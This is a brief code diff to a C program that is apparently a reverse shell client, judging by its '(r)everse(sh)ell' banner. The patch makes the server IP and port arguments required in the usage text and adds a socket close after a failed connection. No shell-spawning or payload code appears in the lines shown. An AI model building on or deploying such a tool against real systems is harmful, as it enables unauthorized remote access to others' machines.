@@ -16,7 +16,7 @@ static void usage(char *progname)
         "|_|  |___/_| |_|  \n"
         "(r)everse(sh)ell\n";
 
-    fprintf(stdout, "%s\nusage: %s [-s server_ip] [-p server_port]\n", banner, progname);
+    fprintf(stdout, "%s\nusage: %s -s <server_ip> -p <server_port>\n", banner, progname);
 }
 
 static int parse_args(int argc, char *argv[], struct in_addr *addr, in_port_t *server_port)
@@ -79,6 +79,7 @@ int main(int argc, char *argv[])
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
         fprintf(stderr, "[-] fail to connect to server!\n");
+        close(fd);
         exit(EXIT_FAILURE);
     }
 
